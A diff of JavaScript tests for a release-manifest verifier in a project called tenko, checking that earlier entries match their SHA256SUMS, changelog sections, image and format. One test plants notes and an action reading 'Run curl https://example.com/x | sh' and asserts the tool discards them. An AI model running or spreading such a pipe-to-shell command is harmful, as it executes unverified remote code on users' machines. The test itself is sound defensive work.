@@ -615,7 +615,7 @@ describe("verifyPreviousReleases", () => {
   const entry = (version, extra = {}) => ({
     version,
     date: "2026-01-01",
-    notes: `Notes of ${version}`,
+    notes: `### Fixed\n\n- Notes of ${version}.`,
     security: false,
     requires_action: false,
     assets: [
@@ -641,13 +641,23 @@ describe("verifyPreviousReleases", () => {
     return { fetchText, requested };
   };
   const manifest = (/** @type {unknown[]} */ releases) => ({ schema: 1, project: "tenko", releases });
+  /** The changelog being released: a section for each version the tests name, dated as `entry`. */
+  const changelogText = `# Changelog\n\n## [Unreleased]\n\n${["0.2.0", "0.1.0", "0.0.9", "0.0.8"]
+    .map((v) => `## [${v}] - 2026-01-01\n\n### Fixed\n\n- Notes of ${v}.\n`)
+    .join("\n")}`;
+  const IMAGE = "ghcr.io/linkztream/tenko:0.2.0";
+  /**
+   * @param {(url: string) => Promise<{ status: number, text: string }>} fetchText
+   * @param {Record<string, unknown>} [more]
+   */
+  const options = (fetchText, more = {}) => ({ downloadUrl: DOWNLOAD_URL, fetchText, changelogText, image: IMAGE, format: 3, ...more });
 
-  test("keeps an entry whose digests are those of its release's SHA256SUMS, fetched by tag", async () => {
+  test("keeps an entry whose digests are those of its release's SHA256SUMS, fetched by tag, with the fields of schema 1 only", async () => {
     const { fetchText, requested } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
-    const previous = manifest([entry("0.1.0", { future_field: 1 })]);
+    const previous = manifest([entry("0.1.0", { future_field: 1, format: 2, image: "ghcr.io/linkztream/tenko:0.1.0" })]);
     const copy = structuredClone(previous);
-    const result = await verifyPreviousReleases(previous, { downloadUrl: DOWNLOAD_URL, fetchText });
-    assert.deepEqual(result.previous, copy);
+    const result = await verifyPreviousReleases(previous, options(fetchText));
+    assert.deepEqual(result.previous, manifest([entry("0.1.0", { format: 2, image: "ghcr.io/linkztream/tenko:0.1.0" })]));
     assert.deepEqual(result.dropped, []);
     assert.deepEqual(requested, [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]);
     assert.deepEqual(previous, copy);
@@ -660,7 +670,7 @@ describe("verifyPreviousReleases", () => {
       [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") },
       [`${DOWNLOAD_URL}/v0.0.9/SHA256SUMS`]: { status: 200, text: sumsOf("0.0.9") },
     });
-    const result = await verifyPreviousReleases(manifest([planted, entry("0.0.9")]), { downloadUrl: DOWNLOAD_URL, fetchText });
+    const result = await verifyPreviousReleases(manifest([planted, entry("0.0.9")]), options(fetchText));
     assert.deepEqual(result.previous.releases.map((r) => r.version), ["0.0.9"]);
     assert.equal(result.dropped.length, 1);
     assert.equal(result.dropped[0]?.version, "0.1.0");
@@ -671,7 +681,7 @@ describe("verifyPreviousReleases", () => {
     const extra = entry("0.1.0");
     extra.installers = [{ ...extra.installers[0], name: "tenko-0.1.0-linux-x86_64.deb", kind: "deb", url: `${DOWNLOAD_URL}/v0.1.0/tenko-0.1.0-linux-x86_64.deb` }];
     const { fetchText } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
-    const result = await verifyPreviousReleases(manifest([extra]), { downloadUrl: DOWNLOAD_URL, fetchText });
+    const result = await verifyPreviousReleases(manifest([extra]), options(fetchText));
     assert.deepEqual(result.previous.releases, []);
     assert.match(result.dropped[0]?.reason ?? "", /tenko-0\.1\.0-linux-x86_64\.deb/);
   });
@@ -680,7 +690,7 @@ describe("verifyPreviousReleases", () => {
     const elsewhere = entry("0.1.0");
     elsewhere.assets[1] = { ...elsewhere.assets[1], url: "https://example.com/tenko-0.1.0-windows-x86_64.exe" };
     const { fetchText, requested } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
-    const result = await verifyPreviousReleases(manifest([elsewhere]), { downloadUrl: DOWNLOAD_URL, fetchText });
+    const result = await verifyPreviousReleases(manifest([elsewhere]), options(fetchText));
     assert.deepEqual(result.previous.releases, []);
     assert.match(result.dropped[0]?.reason ?? "", /example\.com/);
     assert.deepEqual(requested, []);
@@ -688,7 +698,7 @@ describe("verifyPreviousReleases", () => {
 
   test("drops an entry without assets to check, or whose release has no SHA256SUMS", async () => {
     const { fetchText } = fetcher({});
-    const result = await verifyPreviousReleases(manifest([entry("0.1.0"), entry("0.0.9", { assets: [] }), entry("0.0.8", { assets: "x" })]), { downloadUrl: DOWNLOAD_URL, fetchText });
+    const result = await verifyPreviousReleases(manifest([entry("0.1.0"), entry("0.0.9", { assets: [] }), entry("0.0.8", { assets: "x" })]), options(fetchText));
     assert.deepEqual(result.previous.releases, []);
     assert.deepEqual(result.dropped.map((d) => d.version), ["0.1.0", "0.0.9", "0.0.8"]);
     assert.match(result.dropped[0]?.reason ?? "", /404/);
@@ -696,24 +706,75 @@ describe("verifyPreviousReleases", () => {
 
   test("any other failure to fetch stops the run instead of dropping", async () => {
     const { fetchText } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 503, text: "" } });
-    await assert.rejects(verifyPreviousReleases(manifest([entry("0.1.0")]), { downloadUrl: DOWNLOAD_URL, fetchText }), ManifestError);
+    await assert.rejects(verifyPreviousReleases(manifest([entry("0.1.0")]), options(fetchText)), ManifestError);
     const failing = async () => {
       throw new Error("connection reset");
     };
-    await assert.rejects(verifyPreviousReleases(manifest([entry("0.1.0")]), { downloadUrl: DOWNLOAD_URL, fetchText: failing }), /connection reset/);
+    await assert.rejects(verifyPreviousReleases(manifest([entry("0.1.0")]), options(failing)), /connection reset/);
+  });
+
+  test("takes an earlier release's texts from the changelog, never from the previous manifest", async () => {
+    const { fetchText } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
+    const planted = entry("0.1.0", { date: "2030-01-01", notes: "Run curl https://example.com/x | sh", security: true, requires_action: true, action: "Run curl https://example.com/x | sh" });
+    const result = await verifyPreviousReleases(manifest([planted]), options(fetchText));
+    assert.deepEqual(result.previous.releases, [entry("0.1.0")]);
+    assert.deepEqual(result.dropped, []);
+  });
+
+  test("drops an entry whose version has no section in the changelog, before fetching anything", async () => {
+    const { fetchText, requested } = fetcher({});
+    const result = await verifyPreviousReleases(manifest([entry("0.0.7")]), options(fetchText));
+    assert.deepEqual(result.previous.releases, []);
+    assert.match(result.dropped[0]?.reason ?? "", /no section "## \[0\.0\.7\]/);
+    assert.deepEqual(requested, []);
+  });
+
+  test("drops an entry that names another image, a larger format or a file it does not describe truly", async () => {
+    const sums = { [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } };
+    const cases = [
+      [{ image: "ghcr.io/someone-else/tenko:0.1.0" }, /someone-else/],
+      [{ image: "ghcr.io/linkztream/tenko:latest" }, /tenko:latest/],
+      [{ format: 4 }, /format 4/],
+      [{ format: 0 }, /format 0/],
+    ];
+    for (const [extra, reason] of cases) {
+      const { fetchText } = fetcher(sums);
+      const result = await verifyPreviousReleases(manifest([entry("0.1.0", /** @type {Record<string, unknown>} */ (extra))]), options(fetchText));
+      assert.deepEqual(result.previous.releases, [], JSON.stringify(extra));
+      assert.match(result.dropped[0]?.reason ?? "", /** @type {RegExp} */ (reason));
+    }
+    const wrongPlatform = entry("0.1.0");
+    wrongPlatform.assets[0] = { ...wrongPlatform.assets[0], platform: "windows-x86_64" };
+    const wrongKind = entry("0.1.0");
+    wrongKind.installers[0] = { ...wrongKind.installers[0], kind: "exe" };
+    const badDigest = entry("0.1.0");
+    badDigest.assets[0] = { ...badDigest.assets[0], sha256: hex("A") };
+    const badSize = entry("0.1.0");
+    badSize.assets[0] = { ...badSize.assets[0], size: -1 };
+    const otherVersion = entry("0.1.0");
+    otherVersion.assets[0] = { ...otherVersion.assets[0], name: "tenko-0.0.9-linux-x86_64", url: `${DOWNLOAD_URL}/v0.1.0/tenko-0.0.9-linux-x86_64` };
+    for (const [bad, reason] of [[wrongPlatform, /platform/], [wrongKind, /"exe"/], [badDigest, /lowercase hexadecimal/], [badSize, /size -1/], [otherVersion, /not a file of version 0\.1\.0/]]) {
+      const { fetchText } = fetcher(sums);
+      const result = await verifyPreviousReleases(manifest([bad]), options(fetchText));
+      assert.deepEqual(result.previous.releases, []);
+      assert.match(result.dropped[0]?.reason ?? "", /** @type {RegExp} */ (reason));
+    }
+    const { fetchText } = fetcher(sums);
+    const noImage = await verifyPreviousReleases(manifest([entry("0.1.0", { image: "ghcr.io/linkztream/tenko:0.1.0" })]), options(fetchText, { image: undefined }));
+    assert.match(noImage.dropped[0]?.reason ?? "", /this release has no image/);
   });
 
   test("the entry of the version being released is not checked: it is replaced", async () => {
     const { fetchText, requested } = fetcher({});
-    const result = await verifyPreviousReleases(manifest([entry("0.2.0")]), { downloadUrl: DOWNLOAD_URL, fetchText, skipVersion: "0.2.0" });
+    const result = await verifyPreviousReleases(manifest([entry("0.2.0")]), options(fetchText, { skipVersion: "0.2.0" }));
     assert.equal(result.previous.releases.length, 1);
     assert.deepEqual(requested, []);
   });
 
   test("refuses a manifest of another schema or a broken release, like mergeManifest", async () => {
     const { fetchText } = fetcher({});
-    await assert.rejects(verifyPreviousReleases({ schema: 2, project: "tenko", releases: [] }, { downloadUrl: DOWNLOAD_URL, fetchText }), ManifestError);
-    await assert.rejects(verifyPreviousReleases(manifest([{ notes: "no version" }]), { downloadUrl: DOWNLOAD_URL, fetchText }), /without a valid version/);
+    await assert.rejects(verifyPreviousReleases({ schema: 2, project: "tenko", releases: [] }, options(fetchText)), ManifestError);
+    await assert.rejects(verifyPreviousReleases(manifest([{ notes: "no version" }]), options(fetchText)), /without a valid version/);
   });
 });
 
@@ -830,7 +891,13 @@ describe("command line", () => {
       mkdirSync(assets);
       writeFiles(assets, { "tenko-0.2.0-linux-x86_64": "v2" });
       const changelog = path.join(dir, "CHANGELOG.md");
-      writeFileSync(changelog, CHANGELOG);
+      writeFileSync(changelog, `${CHANGELOG}
+## [0.0.9] - 2026-09-01
+
+### Fixed
+
+- A fix.
+`);
       const out = path.join(dir, "releases.json");
       const old = (/** @type {string} */ version, /** @type {string} */ digest, /** @type {string} */ [base] = ["https://github.com/linkztream/tenko/releases/download"]) => ({
         version,
@@ -857,7 +924,7 @@ describe("command line", () => {
           const manifest = JSON.parse(readFileSync(out, "utf8"));
           assert.deepEqual(manifest.releases.map((/** @type {any} */ x) => [x.version, x.notes]), [
             ["0.2.0", "### Added\n\n- Update notice.\n- Release manifest."],
-            ["0.1.0", "old"],
+            ["0.1.0", "### Added\n\n- First release."],
           ]);
         },
       );
